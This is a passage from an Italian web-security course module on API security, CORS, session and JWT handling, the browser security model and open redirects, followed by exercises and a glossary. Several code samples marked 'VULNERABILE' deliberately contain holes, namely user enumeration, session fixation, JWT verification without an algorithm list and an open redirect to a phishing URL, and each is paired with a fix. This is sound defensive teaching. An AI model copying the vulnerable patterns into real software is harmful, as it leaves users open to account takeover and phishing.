Alcune API key sono progettate per essere pubbliche (es. Stripe publishable key, Google Maps API key per il frontend). Per queste chiavi, la protezione avviene tramite restrizioni configurate sulla piattaforma del provider.

```javascript
// Chiave pubblica Stripe — progettata per il frontend
// Può solo creare token di pagamento, non addebitare
const stripe = Stripe('pk_live_xyz789');

// Proteggere le chiavi pubbliche con restrizioni:
// - Google Maps: restrizione per dominio (HTTP Referrer)
// - Firebase: regole di sicurezza Firestore + App Check
// - Stripe pk_: può solo creare PaymentIntent, non leggere dati sensibili
```

---

## API Security Avanzata

### Rate Limiting per Endpoint

Non tutti gli endpoint necessitano dello stesso livello di rate limiting. Gli endpoint di autenticazione, password reset e registrazione richiedono limiti molto più restrittivi rispetto alle API di lettura dati.

```javascript
// Rate limiting differenziato per endpoint
const limits = {
  login:      { windowMs: 15 * 60 * 1000, max: 5 },     // 5/15min
  register:   { windowMs: 60 * 60 * 1000, max: 3 },     // 3/ora
  resetPwd:   { windowMs: 60 * 60 * 1000, max: 3 },     // 3/ora
  apiRead:    { windowMs: 60 * 1000, max: 100 },          // 100/min
  apiWrite:   { windowMs: 60 * 1000, max: 20 },           // 20/min
  upload:     { windowMs: 60 * 60 * 1000, max: 10 },     // 10/ora
};
```

### Input Validation con Zod

Zod offre una sintassi più moderna e type-safe rispetto a Joi, con inferenza dei tipi TypeScript.

```typescript
import { z } from 'zod';

// Schema di validazione per un endpoint API
const CreateUserSchema = z.object({
  username: z.string()
    .min(3, 'Username troppo corto')
    .max(30, 'Username troppo lungo')
    .regex(/^[a-zA-Z0-9_]+$/, 'Solo lettere, numeri e underscore'),

  email: z.string()
    .email('Email non valida')
    .max(254)
    .transform(v => v.toLowerCase().trim()),

  password: z.string()
    .min(12, 'Password troppo corta')
    .max(128, 'Password troppo lunga')
    .regex(
      /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^a-zA-Z0-9])/,
      'Deve contenere maiuscola, minuscola, numero e carattere speciale'
    ),

  age: z.number().int().min(13).max(150).optional()
});

// Il tipo TypeScript viene inferito dallo schema
type CreateUserInput = z.infer<typeof CreateUserSchema>;

// Middleware generico di validazione Zod
function validateZod<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: 'Validazione fallita',
        details: result.error.issues.map(i => ({
          path: i.path.join('.'),
          message: i.message
        }))
      });
    }
    req.body = result.data;
    next();
  };
}

// Validazione query parameters
const PaginationSchema = z.object({
  page: z.coerce.number().int().min(1).max(10000).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['created_at', 'updated_at', 'name']).default('created_at'),
  order: z.enum(['asc', 'desc']).default('desc')
});

// Validazione path parameters (UUID)
const UUIDParam = z.object({
  id: z.string().uuid('ID non valido')
});
```

### Protezione contro Enumerazione

L'enumerazione si verifica quando un attaccante può determinare l'esistenza di risorse (utenti, email, account) osservando le risposte dell'API.

```javascript
// VULNERABILE — rivela se l'email è registrata
app.post('/forgot-password', async (req, res) => {
  const user = await findUserByEmail(req.body.email);
  if (!user) {
    return res.status(404).json({ error: 'Email non trovata' }); // INFORMAZIONE LEAKING
  }
  await sendResetEmail(user);
  res.json({ message: 'Email di reset inviata' });
});

// SICURO — risposta identica in entrambi i casi
app.post('/forgot-password', async (req, res) => {
  const user = await findUserByEmail(req.body.email);
  if (user) {
    await sendResetEmail(user);
  }
  // Stessa risposta indipendentemente dall'esistenza dell'utente
  // Stesso tempo di risposta (timing attack prevention)
  res.json({ message: 'Se l\'indirizzo è registrato, riceverai un\'email.' });
});

// Prevenzione timing attack: eseguire sempre lo stesso lavoro
app.post('/login', async (req, res) => {
  const user = await findUserByUsername(req.body.username);

  if (!user) {
    // Eseguire comunque un hash per uniformare il tempo di risposta
    await argon2.hash('dummy-password');
    return res.status(401).json({ error: 'Credenziali non valide' });
  }

  const valid = await argon2.verify(user.passwordHash, req.body.password);
  if (!valid) {
    return res.status(401).json({ error: 'Credenziali non valide' });
  }

  // Login riuscito
});
```

---

## CORS Deep Dive — Preflight, Credenziali e Configurazione Sicura

### Richieste Semplici vs. Richieste con Preflight

Il browser distingue tra richieste "semplici" (che non richiedono preflight) e richieste "complesse" (che lo richiedono). Una richiesta è semplice solo se soddisfa tutti questi criteri: metodo GET, HEAD o POST; solo header "CORS-safelisted" (Accept, Accept-Language, Content-Language, Content-Type limitato a application/x-www-form-urlencoded, multipart/form-data, text/plain); nessun ReadableStream nel body.

Qualsiasi deviazione (metodo PUT/DELETE, header Authorization, Content-Type: application/json) attiva il preflight OPTIONS.

```
# Sequenza preflight completa

1. Browser → Server: OPTIONS /api/data HTTP/1.1
   Origin: https://app.example.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: Content-Type, Authorization, X-Request-ID

2. Server → Browser: HTTP/1.1 204 No Content
   Access-Control-Allow-Origin: https://app.example.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Content-Type, Authorization, X-Request-ID
   Access-Control-Allow-Credentials: true
   Access-Control-Max-Age: 86400
   Vary: Origin

3. Browser → Server: PUT /api/data HTTP/1.1
   Origin: https://app.example.com
   Content-Type: application/json
   Authorization: Bearer eyJhbG...
   X-Request-ID: req-123

4. Server → Browser: HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://app.example.com
   Access-Control-Expose-Headers: X-Request-ID
   Vary: Origin
```

### Credenziali e CORS

Quando `credentials: 'include'` è usato nel fetch, il browser invia cookie e header di autenticazione. In questo caso, le regole CORS diventano più restrittive.

```javascript
// Con credentials: 'include', il server NON può rispondere con:
// Access-Control-Allow-Origin: *          ← deve essere un'origine specifica
// Access-Control-Allow-Headers: *         ← deve elencare esplicitamente
// Access-Control-Allow-Methods: *         ← deve elencare esplicitamente
// Access-Control-Expose-Headers: *        ← deve elencare esplicitamente

// Errore comune — origin wildcard con credentials
const corsOptions = {
  origin: '*',           // ERRORE con credentials: true
  credentials: true
};

// Correzione — origin dinamico basato su allowlist
const corsOptions = {
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.has(origin)) {
      callback(null, origin);  // riflettere l'origine specifica
    } else {
      callback(new Error('Origine non consentita'));
    }
  },
  credentials: true
};
```

### Header Vary e Caching

Quando `Access-Control-Allow-Origin` riflette l'origine della richiesta (anziché `*`), è fondamentale includere `Vary: Origin` nella risposta. Senza questo header, un proxy o CDN potrebbe cachare una risposta con un'origine specifica e servirla a richieste da origini diverse, causando errori CORS.

```javascript
// Middleware CORS corretto con Vary
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && allowedOrigins.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');  // CRITICO per il caching
  }
  next();
});
```

---

## Sicurezza dell'Autenticazione — Approfondimento

### Session Fixation

L'attacco di session fixation avviene quando un attaccante fissa un ID di sessione prima che la vittima si autentichi. Se l'applicazione non rigenera l'ID di sessione dopo il login, l'attaccante può usare l'ID fissato per accedere alla sessione autenticata della vittima.

```javascript
// VULNERABILE — l'ID di sessione non viene rigenerato dopo il login
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (user) {
    req.session.userId = user.id;  // l'ID di sessione resta lo stesso
    res.json({ success: true });
  }
});

// SICURO — rigenerazione dell'ID di sessione dopo l'autenticazione
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (user) {
    // Distruggere la sessione corrente e crearne una nuova
    const oldData = { ...req.session };  // preservare dati se necessario
    req.session.regenerate((err) => {
      if (err) return next(err);
      req.session.userId = user.id;
      req.session.loginAt = Date.now();
      req.session.ipAtLogin = req.ip;
      res.json({ success: true });
    });
  }
});
```

### JWT Security

I JSON Web Token sono ampiamente utilizzati per l'autenticazione stateless, ma una configurazione errata introduce vulnerabilità critiche.

```javascript
import jwt from 'jsonwebtoken';

// VULNERABILE — algoritmo 'none' accettato
const decoded = jwt.verify(token, secret); // se il token usa alg: 'none'

// SICURO — specificare esplicitamente l'algoritmo accettato
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'],       // solo algoritmi specifici
  maxAge: '1h',                // durata massima del token
  issuer: 'https://example.com',
  audience: 'https://api.example.com'
});

// Regole per JWT sicuri:
// 1. Mai accettare alg: 'none'
// 2. Specificare sempre algorithms nella verifica
// 3. Validare iss (issuer) e aud (audience)
// 4. Impostare exp (expiration) breve (15 min per access token)
// 5. Usare refresh token con rotazione per rinnovare
// 6. Invalidare i refresh token al logout (richiede storage server-side)

// Rotazione dei refresh token
app.post('/token/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  // Verificare il refresh token nel database
  const stored = await db.query(
    'SELECT * FROM refresh_tokens WHERE token_hash = $1 AND revoked = false AND expires_at > NOW()',
    [hashToken(refreshToken)]
  );

  if (stored.rows.length === 0) {
    return res.status(401).json({ error: 'Refresh token non valido' });
  }

  // Revocare il vecchio refresh token (rotazione)
  await db.query(
    'UPDATE refresh_tokens SET revoked = true WHERE id = $1',
    [stored.rows[0].id]
  );

  // Generare nuovi token
  const user = await getUser(stored.rows[0].user_id);
  const newAccessToken = jwt.sign({ sub: user.id, role: user.role }, secret, {
    algorithm: 'HS256',
    expiresIn: '15m',
    issuer: 'https://example.com'
  });

  const newRefreshToken = crypto.randomBytes(32).toString('hex');
  await db.query(
    'INSERT INTO refresh_tokens (user_id, token_hash, expires_at) VALUES ($1, $2, $3)',
    [user.id, hashToken(newRefreshToken), new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)]
  );

  res.json({ accessToken: newAccessToken, refreshToken: newRefreshToken });
});
```

### Protezione da Brute Force con CAPTCHA Progressivo

Anziché mostrare un CAPTCHA a ogni tentativo, un approccio progressivo lo attiva solo dopo un numero di tentativi falliti, riducendo l'impatto sull'esperienza utente.

```javascript
async function loginWithProgressiveCaptcha(req, res) {
  const { username, password, captchaResponse } = req.body;
  const failedAttempts = await getFailedAttempts(req.ip, username);

  // Dopo 3 tentativi falliti, richiedere CAPTCHA
  if (failedAttempts >= 3) {
    if (!captchaResponse) {
      return res.status(400).json({
        error: 'Verifica CAPTCHA richiesta',
        requiresCaptcha: true
      });
    }

    const captchaValid = await verifyCaptcha(captchaResponse);
    if (!captchaValid) {
      return res.status(400).json({ error: 'CAPTCHA non valido' });
    }
  }

  // Dopo 10 tentativi, bloccare temporaneamente
  if (failedAttempts >= 10) {
    return res.status(429).json({
      error: 'Account temporaneamente bloccato',
      retryAfter: 900 // 15 minuti
    });
  }

  // Procedere con l'autenticazione
  const user = await authenticateUser(username, password);
  if (!user) {
    await recordFailedAttempt(req.ip, username);
    return res.status(401).json({ error: 'Credenziali non valide' });
  }

  await clearFailedAttempts(req.ip, username);
  // ...
}
```

---

## Modello di Sicurezza del Browser

Comprendere i meccanismi di sicurezza interni del browser è fondamentale per capire perché determinate vulnerabilità sono possibili e come le difese funzionano.

### Same-Origin Policy (SOP) — Dettagli

La SOP è il fondamento della sicurezza web nel browser. Isola i contesti di esecuzione JavaScript in base alla loro origine (protocollo + host + porta). Uno script caricato da `https://a.com` non può leggere il DOM, i cookie o le risposte di rete di `https://b.com`.

**Cosa la SOP blocca:** accesso JavaScript cross-origin al DOM (via iframe), lettura di risposte fetch/XHR cross-origin (senza CORS), accesso a cookie di altre origini, accesso a localStorage/sessionStorage di altre origini.

**Cosa la SOP NON blocca:** embedding di risorse cross-origin (`<img>`, `<script>`, `<link>`, `<iframe>`), invio di richieste cross-origin (il browser le invia, ma non ne mostra la risposta a JavaScript senza CORS), form submission cross-origin (la base del CSRF).

### Process Isolation e Site Isolation

I browser moderni (Chrome dal 2018) eseguono ogni sito in un processo separato del sistema operativo (Site Isolation). Questo impedisce attacchi side-channel come Spectre, dove un processo malevolo potrebbe leggere la memoria di un altro processo.

L'abilitazione del cross-origin isolation tramite gli header COOP e COEP (descritti nella sezione Security Headers) rafforza ulteriormente questo isolamento, prevenendo la condivisione di finestre e risorse tra origini diverse e abilitando API ad alta precisione (come `performance.now()` con risoluzione al microsecondo e `SharedArrayBuffer`) solo in contesti isolati.

### Sandbox per iframe

L'attributo `sandbox` sugli iframe limita le capacità del contenuto embedded, applicando il principio del minimo privilegio.

```html
<!-- iframe completamente sandboxed — nessuna capacità -->
<iframe src="https://untrusted.com" sandbox></iframe>

<!-- iframe con capacità selettive -->
<iframe
  src="https://widget.partner.com"
  sandbox="allow-scripts allow-same-origin allow-forms"
  loading="lazy"
  referrerpolicy="no-referrer">
</iframe>

<!--
  Valori sandbox disponibili:
  allow-scripts        → esecuzione JavaScript
  allow-same-origin    → mantenere l'origine (senza questo, l'iframe ha un'origine opaca)
  allow-forms          → invio form
  allow-popups         → apertura nuove finestre
  allow-top-navigation → navigazione del frame padre
  allow-modals         → alert(), confirm(), prompt()

  ATTENZIONE: allow-scripts + allow-same-origin insieme permettono all'iframe
  di rimuovere il proprio attributo sandbox. Usare questa combinazione solo
  con contenuti di cui ci si fida.
-->
```

### Navigazione e Redirection Security

I redirect possono essere sfruttati per attacchi di open redirect, dove un'applicazione reindirizza l'utente verso un URL controllato dall'attaccante.

```javascript
// VULNERABILE — open redirect
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url); // un attaccante può inviare: /redirect?url=https://phishing.com
});

// SICURO — validazione del redirect
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  try {
    const parsed = new URL(url, 'https://example.com');
    // Consentire solo redirect interni (stesso host)
    if (parsed.origin !== 'https://example.com') {
      return res.status(400).json({ error: 'Redirect esterno non consentito' });
    }
    res.redirect(parsed.pathname + parsed.search);
  } catch {
    res.status(400).json({ error: 'URL non valido' });
  }
});
```

---

## Risorse di Riferimento

| Risorsa | URL |
|---------|-----|
| OWASP Top 10 | owasp.org/Top10 |
| OWASP Cheat Sheet Series | cheatsheetseries.owasp.org |
| Mozilla Web Security Guidelines | infosec.mozilla.org |
| helmet.js | helmetjs.github.io |
| CWE/SANS Top 25 | cwe.mitre.org/top25 |
| SSL Labs Test | ssllabs.com/ssltest |
| SecurityHeaders.com | securityheaders.com |

---

## Esercizi

### Esercizio 1 — Audit di sicurezza su un'applicazione vulnerabile

**Obiettivo:** Identificare e correggere le vulnerabilità OWASP Top 10 in un'applicazione Node.js intenzionalmente vulnerabile.

Partire da un'applicazione Express con le seguenti vulnerabilità deliberate e correggerle una per una:

- **SQL Injection**: endpoint `GET /users?search=` che concatena il parametro direttamente nella query SQL — correggere con query parametrizzate
- **XSS Stored**: endpoint `POST /comments` che salva HTML non sanitizzato e lo restituisce senza encoding — correggere con sanitizzazione input (DOMPurify server-side) e output encoding
- **CSRF**: form POST di cambio password senza token CSRF — correggere con `csurf` o double-submit cookie pattern
- **Broken Access Control**: endpoint `GET /users/:id/profile` che non verifica che l'utente autenticato sia il proprietario del profilo — correggere con middleware di ownership check
- **Security Misconfiguration**: server che espone stack trace in produzione, header `X-Powered-By` presente, CORS con `origin: '*'` — correggere con Helmet, error handler custom e CORS restrittivo

Per ogni vulnerabilità:
- Documentare il vettore di attacco con una richiesta curl di esempio
- Scrivere il codice corretto con commento che spieghi la contromisura
- Scrivere un test che verifichi che la vulnerabilità sia stata eliminata

### Esercizio 2 — Content Security Policy progressiva

**Obiettivo:** Configurare una CSP da report-only a enforcement, gestendo le violazioni senza rompere l'applicazione.

Implementare una CSP completa per un'applicazione web con contenuti dinamici:

- Fase 1 — **Report-Only**: configurare `Content-Security-Policy-Report-Only` con policy restrittiva, endpoint `POST /csp-report` che riceva e salvi i report di violazione in un file JSON
- Fase 2 — **Analisi**: lanciare l'applicazione, navigare tutte le pagine, analizzare i report raccolti per identificare risorse bloccate legittime (font CDN, script analytics, immagini esterne)
- Fase 3 — **Policy definitiva**: costruire la CSP finale con:
  - `default-src 'self'`
  - `script-src 'self' 'nonce-{random}'` (generare nonce per-request e iniettarlo in ogni tag `<script>`)
  - `style-src 'self' 'unsafe-inline'` (solo se necessario per librerie CSS-in-JS, altrimenti nonce anche per gli stili)
  - `img-src 'self' data: https:`
  - `font-src 'self' https://fonts.gstatic.com`
  - `connect-src 'self' https://api.example.com`
  - `frame-src 'none'`
  - `object-src 'none'`
  - `base-uri 'self'`
  - `form-action 'self'`
- Fase 4 — **Enforcement**: rimuovere il suffisso `-Report-Only` e verificare che l'applicazione funzioni correttamente
- Middleware che generi un nonce random per ogni richiesta e lo renda disponibile ai template
- Test che verifichino la presenza e la correttezza degli header CSP in ogni risposta

### Esercizio 3 — Security headers e hardening HTTP

**Obiettivo:** Configurare tutti i security headers raccomandati e verificarli con strumenti automatizzati.

Implementare e testare il set completo di security headers:

- Configurare tramite Helmet (Express) o `@fastify/helmet` i seguenti header:
  - `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
  - `X-Content-Type-Options: nosniff`
  - `X-Frame-Options: DENY`
  - `Referrer-Policy: strict-origin-when-cross-origin`
  - `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()`
  - `Cross-Origin-Opener-Policy: same-origin`
  - `Cross-Origin-Resource-Policy: same-origin`
  - `Cross-Origin-Embedder-Policy: require-corp` (se l'applicazione non carica risorse cross-origin)
- Configurare CORS con whitelist esplicita di origini permesse, metodi e header consentiti, `credentials: true` solo per le origini nella whitelist
- Implementare SRI (Subresource Integrity) per tutti gli script e stylesheet caricati da CDN
- Scrivere un test di integrazione che per ogni risposta verifichi la presenza di tutti gli header attesi
- Eseguire il test su https://securityheaders.com (o equivalente) e documentare il punteggio ottenuto
- Identificare e documentare i trade-off di `COEP: require-corp` quando si caricano risorse da terze parti

### Esercizio 4 — Input validation e output encoding difensivi

**Obiettivo:** Costruire un layer di validazione e sanitizzazione che prevenga injection a ogni livello.

Implementare un middleware di validazione e sanitizzazione completo:

- **Validazione input** con Zod per ogni endpoint:
  - Body: tipo, formato, lunghezza, pattern regex per campi specifici (email, URL, telefono)
  - Query params: tipo numerico per page/limit con min/max, enum per valori consentiti
  - Path params: formato UUID v4 o numerico positivo
  - Header: `Content-Type` atteso, `Accept` supportati
- **Sanitizzazione output**: middleware che per ogni risposta JSON esegua l'encoding dei caratteri HTML speciali (`<`, `>`, `&`, `"`, `'`) nei valori stringa
- **Protezione NoSQL injection** (se MongoDB): rifiutare oggetti con chiavi che iniziano con `$` nel body della richiesta
- **Protezione Path Traversal**: validare che i path dei file richiesti non contengano `..` e siano contenuti nella directory consentita (`path.resolve` + verifica prefisso)
- **Protezione SSRF**: per endpoint che accettano URL come input, validare che l'URL non punti a indirizzi interni (127.0.0.1, 10.x.x.x, 192.168.x.x, 169.254.x.x, localhost)
- Test per ogni tipo di injection con payload reali tratti da wordlist OWASP (almeno 5 payload per tipo)

### Esercizio 5 — Pipeline di sicurezza automatizzata con CI/CD

**Obiettivo:** Integrare strumenti di sicurezza automatizzati nella pipeline di sviluppo.

Costruire una pipeline GitHub Actions (o equivalente) con i seguenti stage:

- **Dependency audit**: `npm audit --audit-level=high` che faccia fallire la build se esistono vulnerabilità high o critical
- **Secret scanning**: integrare `gitleaks` per rilevare segreti committati accidentalmente (API key, password, token) con pattern personalizzati per il progetto
- **SAST (Static Analysis)**: configurare ESLint con `eslint-plugin-security` e `eslint-plugin-no-unsanitized`, CodeQL con query JavaScript/TypeScript
- **SCA (Software Composition Analysis)**: Snyk o `npm audit signatures` per verificare integrità e vulnerabilità delle dipendenze
- **DAST (Dynamic Analysis)**: OWASP ZAP in modalità headless contro l'applicazione in esecuzione nell'ambiente di staging
- Configurare notifiche (webhook o email) per ogni vulnerabilità trovata con severity >= HIGH
- Creare un file `.security-policy.yml` che definisca: severity thresholds per blocco build, eccezioni accettate con giustificazione e scadenza, responsabile della revisione
- Documentare la pipeline con un diagramma che mostri l'ordine degli stage e le condizioni di blocco
- Test della pipeline: committare intenzionalmente un segreto e verificare che la build fallisca; correggere e verificare che passi

---

## Letture e Riferimenti

### Documentazione ufficiale

- **OWASP Top 10 (2021)** — classifica delle dieci vulnerabilità più critiche nelle applicazioni web. https://owasp.org/Top10/ (consultato: 2026-05-24)
- **OWASP Cheat Sheet Series** — raccolte di contromisure pratiche per ogni categoria di vulnerabilità. https://cheatsheetseries.owasp.org/ (consultato: 2026-05-24)
- **MDN Web Security** — documentazione Mozilla sulla sicurezza web lato client e server. https://developer.mozilla.org/en-US/docs/Web/Security (consultato: 2026-05-24)
- **Content Security Policy (CSP) Level 3** — specifica W3C per la policy di sicurezza dei contenuti. https://www.w3.org/TR/CSP3/ (consultato: 2026-05-24)
- **Helmet.js Documentation** — middleware Node.js per la configurazione dei security headers. https://helmetjs.github.io/ (consultato: 2026-05-24)
- **CWE (Common Weakness Enumeration)** — catalogo delle debolezze software con classificazione e riferimenti. https://cwe.mitre.org/ (consultato: 2026-05-24)
- **RFC 6797 — HTTP Strict Transport Security (HSTS)** — specifica per forzare connessioni HTTPS. https://www.rfc-editor.org/rfc/rfc6797 (consultato: 2026-05-24)
- **Subresource Integrity (SRI)** — specifica W3C per la verifica dell'integrità delle risorse caricate da CDN. https://www.w3.org/TR/SRI/ (consultato: 2026-05-24)

### Libri e approfondimenti

- Hoffman, Andrew, *Web Application Security*, O'Reilly, 2020.
- Stuttard, Dafydd; Pinto, Marcus, *The Web Application Hacker's Handbook*, Wiley, 2011.
- McDonald, Malcolm, *Web Security for Developers*, No Starch Press, 2020.

---

## Riferimenti Incrociati

| Modulo | Relazione |
|---|---|
| [04 — JavaScript Fondamenti](04-javascript-fondamenti.md) | Prerequisito: comprensione di DOM manipulation, event handling e potenziali vettori XSS |
| [10 — Node.js](10-nodejs.md) | Prerequisito: middleware, Helmet, CORS e error handling implementati in ambiente server Node.js |
| [13 — Autenticazione e Autorizzazione](13-autenticazione-autorizzazione.md) | Complementare: autenticazione sicura e gestione sessioni dipendono dalle contromisure di sicurezza |
| [11 — API Design](11-api-design.md) | Rate limiting, input validation e security headers applicati alla protezione delle API |
| [22 — Rate Limiting Edge](22-rate-limiting-edge.md) | Approfondimento su rate limiting distribuito e protezione a livello edge/CDN |
| [23 — WebSocket Security](23-websocket-security.md) | Estensione della sicurezza web ai canali bidirezionali WebSocket |

---

## Glossario

| Termine | Definizione |
|---|---|
| **XSS** | Cross-Site Scripting: iniezione di script malevoli in pagine web visualizzate da altri utenti. |
| **CSRF** | Cross-Site Request Forgery: attacco che induce il browser di un utente autenticato a eseguire azioni non intenzionali. |
| **CSP** | Content Security Policy: header HTTP che definisce le sorgenti di contenuto autorizzate per una pagina web. |
| **CORS** | Cross-Origin Resource Sharing: meccanismo HTTP che consente o nega richieste tra origini diverse. |
| **SRI** | Subresource Integrity: attributo HTML che verifica l'integrità di risorse esterne tramite hash crittografico. |
| **HSTS** | HTTP Strict Transport Security: header che forza il browser a comunicare esclusivamente via HTTPS. |
| **SQL Injection** | Attacco che inserisce istruzioni SQL malevole tramite input non sanitizzati per manipolare il database. |
| **SSRF** | Server-Side Request Forgery: vulnerabilità che induce il server a effettuare richieste verso destinazioni non previste. |
| **Nonce** | Valore casuale monouso generato per-request, utilizzato nelle CSP per autorizzare script inline specifici. |
| **Helmet** | Middleware Node.js che configura automaticamente i security headers HTTP più comuni. |
| **SAST** | Static Application Security Testing: analisi del codice sorgente per individuare vulnerabilità senza eseguire l'applicazione. |
| **DAST** | Dynamic Application Security Testing: analisi di sicurezza eseguita contro l'applicazione in esecuzione. |
| **OWASP** | Open Web Application Security Project: community open-source dedicata alla sicurezza delle applicazioni web. |
| **Sanitizzazione** | Processo di pulizia dei dati in input per rimuovere o neutralizzare contenuto potenzialmente pericoloso. |
| **Output Encoding** | Trasformazione dei caratteri speciali in entità sicure prima di inserirli in un contesto di rendering (HTML, URL, JS). |
